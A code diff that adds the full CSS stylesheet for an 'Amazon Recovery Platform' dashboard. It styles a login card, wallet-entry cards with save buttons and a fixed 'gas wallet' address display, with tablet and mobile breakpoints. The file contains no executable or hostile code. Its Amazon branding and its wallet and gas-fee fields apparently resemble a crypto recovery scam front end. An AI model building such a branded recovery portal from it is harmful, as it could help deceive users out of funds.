@@ -1,1 +1,556 @@
+/* =========================================
+   AMAZON RECOVERY PLATFORM
+   Responsive Dashboard Styles
+   Desktop • iPad • Mobile
+========================================= */
 
+:root {
+  --primary: #2463eb;
+  --primary-dark: #1749b8;
+  --primary-light: #eaf1ff;
+
+  --background: #f4f7fb;
+  --card: #ffffff;
+  --text: #172033;
+  --muted: #718096;
+  --border: #e3e8f0;
+
+  --success: #168a55;
+
+  --shadow: 0 10px 30px rgba(31, 55, 90, 0.08);
+
+  --radius: 18px;
+}
+
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+html {
+  min-height: 100%;
+  font-family: Arial, Helvetica, sans-serif;
+  background: var(--background);
+}
+
+body {
+  min-height: 100vh;
+  background: var(--background);
+  color: var(--text);
+}
+
+button,
+input {
+  font: inherit;
+}
+
+button {
+  cursor: pointer;
+}
+
+.hidden {
+  display: none !important;
+}
+
+
+/* =========================================
+   LOGIN
+========================================= */
+
+.login-screen {
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+  background:
+    linear-gradient(
+      180deg,
+      #2463eb 0,
+      #2463eb 230px,
+      var(--background) 230px,
+      var(--background) 100%
+    );
+}
+
+.login-card {
+  width: 100%;
+  max-width: 440px;
+  background: var(--card);
+  border-radius: 22px;
+  padding: 42px 34px;
+  box-shadow: 0 20px 55px rgba(21, 45, 85, 0.15);
+  text-align: center;
+}
+
+.brand-mark {
+  width: 68px;
+  height: 68px;
+  margin: 0 auto 20px;
+  border-radius: 18px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: var(--primary);
+  color: #ffffff;
+  font-size: 23px;
+  font-weight: 800;
+  letter-spacing: -1px;
+}
+
+.login-card h1 {
+  font-size: 27px;
+  line-height: 1.2;
+  margin-bottom: 10px;
+}
+
+.login-subtitle {
+  color: var(--muted);
+  font-size: 15px;
+  margin-bottom: 30px;
+}
+
+.login-card form {
+  text-align: left;
+}
+
+.login-card label {
+  display: block;
+  margin-bottom: 9px;
+  font-size: 14px;
+  font-weight: 700;
+}
+
+.login-card input {
+  width: 100%;
+  height: 52px;
+  padding: 0 16px;
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  outline: none;
+  background: #ffffff;
+  color: var(--text);
+  transition: border-color 0.2s ease, box-shadow 0.2s ease;
+}
+
+.login-card input:focus {
+  border-color: var(--primary);
+  box-shadow: 0 0 0 4px rgba(36, 99, 235, 0.10);
+}
+
+.primary-button {
+  width: 100%;
+  height: 52px;
+  margin-top: 18px;
+  border: 0;
+  border-radius: 12px;
+  background: var(--primary);
+  color: #ffffff;
+  font-size: 16px;
+  font-weight: 700;
+  transition: background 0.2s ease, transform 0.2s ease;
+}
+
+.primary-button:hover {
+  background: var(--primary-dark);
+}
+
+.primary-button:active {
+  transform: translateY(1px);
+}
+
+
+/* =========================================
+   DASHBOARD HEADER
+========================================= */
+
+.dashboard-screen {
+  min-height: 100vh;
+  background: var(--background);
+}
+
+.top-header {
+  width: 100%;
+  min-height: 76px;
+  display: flex;
+  align-items: center;
+  background: var(--primary);
+  color: #ffffff;
+  padding: 0 32px;
+}
+
+.brand {
+  display: flex;
+  align-items: center;
+  gap: 13px;
+}
+
+.brand-mark.small {
+  width: 44px;
+  height: 44px;
+  margin: 0;
+  border-radius: 12px;
+  background: #ffffff;
+  color: var(--primary);
+  font-size: 16px;
+}
+
+.brand h1 {
+  font-size: 19px;
+  line-height: 1.2;
+  font-weight: 800;
+}
+
+.brand span {
+  display: block;
+  margin-top: 3px;
+  font-size: 12px;
+  opacity: 0.82;
+}
+
+
+/* =========================================
+   DASHBOARD CONTENT
+========================================= */
+
+.dashboard-container {
+  width: min(1180px, calc(100% - 40px));
+  margin: 30px auto;
+}
+
+.welcome-card {
+  min-height: 135px;
+  display: flex;
+  align-items: center;
+  padding: 28px;
+  margin-bottom: 22px;
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  box-shadow: var(--shadow);
+}
+
+.section-label {
+  color: var(--muted);
+  font-size: 13px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.7px;
+  margin-bottom: 8px;
+}
+
+.welcome-card h2 {
+  font-size: 27px;
+  line-height: 1.25;
+  overflow-wrap: anywhere;
+}
+
+
+/* =========================================
+   WALLET CARDS
+========================================= */
+
+.wallet-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 20px;
+}
+
+.wallet-card {
+  min-width: 0;
+  min-height: 300px;
+  display: flex;
+  flex-direction: column;
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 25px;
+  box-shadow: var(--shadow);
+}
+
+.card-icon {
+  width: 48px;
+  height: 48px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 20px;
+  border-radius: 14px;
+  background: var(--primary-light);
+  color: var(--primary);
+  font-size: 22px;
+  font-weight: 700;
+}
+
+.card-content {
+  width: 100%;
+}
+
+.card-content h3 {
+  font-size: 18px;
+  line-height: 1.35;
+  margin-bottom: 8px;
+}
+
+.card-content p {
+  color: var(--muted);
+  font-size: 14px;
+  line-height: 1.5;
+  margin-bottom: 18px;
+}
+
+
+/* =========================================
+   INPUTS
+========================================= */
+
+.wallet-card input {
+  width: 100%;
+  min-width: 0;
+  height: 50px;
+  padding: 0 14px;
+  border: 1px solid var(--border);
+  border-radius: 11px;
+  outline: none;
+  background: #ffffff;
+  color: var(--text);
+}
+
+.wallet-card input:focus {
+  border-color: var(--primary);
+  box-shadow: 0 0 0 4px rgba(36, 99, 235, 0.10);
+}
+
+.input-row {
+  width: 100%;
+  display: flex;
+  gap: 9px;
+}
+
+.input-row input {
+  flex: 1;
+}
+
+.save-button {
+  height: 50px;
+  padding: 0 18px;
+  border: 0;
+  border-radius: 11px;
+  background: var(--primary);
+  color: #ffffff;
+  font-weight: 700;
+  white-space: nowrap;
+}
+
+.save-button:hover {
+  background: var(--primary-dark);
+}
+
+
+/* =========================================
+   SAVED MESSAGE
+========================================= */
+
+.saved-message {
+  min-height: 20px;
+  margin-top: 10px;
+  color: var(--success);
+  font-size: 13px;
+  font-weight: 700;
+  overflow-wrap: anywhere;
+}
+
+
+/* =========================================
+   FIXED GAS WALLET DISPLAY
+========================================= */
+
+.address-display {
+  width: 100%;
+  padding: 15px;
+  border-radius: 11px;
+  border: 1px solid var(--border);
+  background: #f8fafc;
+  overflow: hidden;
+}
+
+.address-display span {
+  display: block;
+  color: var(--text);
+  font-family: "Courier New", Courier, monospace;
+  font-size: 13px;
+  line-height: 1.6;
+  overflow-wrap: anywhere;
+  word-break: break-word;
+}
+
+
+/* =========================================
+   FOOTER
+========================================= */
+
+.dashboard-footer {
+  width: min(1180px, calc(100% - 40px));
+  margin: 0 auto;
+  padding: 25px 0 35px;
+  color: var(--muted);
+  text-align: center;
+  font-size: 13px;
+}
+
+
+/* =========================================
+   iPAD / TABLET
+========================================= */
+
+@media (max-width: 1000px) {
+
+  .wallet-grid {
+    grid-template-columns: repeat(2, 1fr);
+  }
+
+  .wallet-card:last-child {
+    grid-column: 1 / -1;
+  }
+
+}
+
+
+/* =========================================
+   MOBILE
+========================================= */
+
+@media (max-width: 680px) {
+
+  .login-screen {
+    padding: 18px;
+    background:
+      linear-gradient(
+        180deg,
+        #2463eb 0,
+        #2463eb 175px,
+        var(--background) 175px,
+        var(--background) 100%
+      );
+  }
+
+  .login-card {
+    padding: 32px 22px;
+    border-radius: 18px;
+  }
+
+  .login-card h1 {
+    font-size: 23px;
+  }
+
+  .top-header {
+    min-height: 68px;
+    padding: 0 16px;
+  }
+
+  .brand-mark.small {
+    width: 40px;
+    height: 40px;
+  }
+
+  .brand h1 {
+    font-size: 16px;
+  }
+
+  .brand span {
+    font-size: 11px;
+  }
+
+  .dashboard-container {
+    width: calc(100% - 24px);
+    margin: 18px auto;
+  }
+
+  .welcome-card {
+    min-height: 110px;
+    padding: 22px;
+    margin-bottom: 16px;
+  }
+
+  .welcome-card h2 {
+    font-size: 22px;
+  }
+
+  .wallet-grid {
+    grid-template-columns: 1fr;
+    gap: 15px;
+  }
+
+  .wallet-card {
+    min-height: auto;
+    padding: 21px;
+  }
+
+  .wallet-card:last-child {
+    grid-column: auto;
+  }
+
+  .input-row {
+    flex-direction: column;
+  }
+
+  .input-row input,
+  .save-button {
+    width: 100%;
+  }
+
+  .dashboard-footer {
+    width: calc(100% - 24px);
+    padding-bottom: 25px;
+  }
+
+}
+
+
+/* =========================================
+   SMALL MOBILE
+========================================= */
+
+@media (max-width: 390px) {
+
+  .login-card {
+    padding: 28px 18px;
+  }
+
+  .login-card h1 {
+    font-size: 21px;
+  }
+
+  .dashboard-container {
+    width: calc(100% - 18px);
+  }
+
+  .wallet-card {
+    padding: 18px;
+  }
+
+  .address-display {
+    padding: 12px;
+  }
+
+  .address-display span {
+    font-size: 12px;
+  }
+
+}
+
+
+/* =========================================
+   ACCESSIBILITY
+========================================= */
+
+:focus-visible {
+  outline: 3px solid rgba(36, 99, 235, 0.35);
+  outline-offset: 2px;
+}
+
+::selection {
+  background: var(--primary);
+  color: #ffffff;
+}
